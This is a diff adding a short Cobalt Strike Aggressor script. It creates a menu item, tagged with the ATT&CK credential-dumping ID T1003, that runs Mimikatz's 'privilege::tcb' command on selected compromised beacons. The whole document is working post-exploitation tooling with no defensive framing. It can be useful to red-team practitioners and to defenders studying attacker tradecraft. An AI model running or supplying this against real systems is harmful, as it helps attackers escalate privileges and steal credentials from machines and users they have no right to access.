@@ -1,0 +1,13 @@
+# Mimikatz TCB Privilege
+item "Mimikatz - TCB Privilege  - T1003"{
+	local ('$bid');
+		foreach $bid ($1){
+			tcb($bid);
+		}
+}
+
+
+#Mimikatz TCB Privilege
+sub tcb{
+bmimikatz($1, "privilege::tcb");
+}
